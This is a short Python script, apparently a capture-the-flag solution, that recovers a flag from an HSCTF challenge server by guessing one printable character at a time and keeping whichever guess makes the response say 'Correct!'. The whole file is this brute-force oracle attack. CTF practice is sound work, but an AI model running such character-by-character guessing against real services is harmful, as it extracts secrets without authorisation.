import string

import requests

URL = 'http://web1.hsctf.com:8001/guess'
chars = list(string.printable)


def guess(flag):
    r = requests.get(url=URL, params={'guess': flag})
    return 'Correct!' in r.text


def guess_next(current):
    print(current + "... ")
    for c in chars:
        print(c, end='')
        if guess(current + c):
            print()
            if c == '}':
                return current + c
            else:
                return guess_next(current + c)
    print("Failed!")


print(guess_next(''))
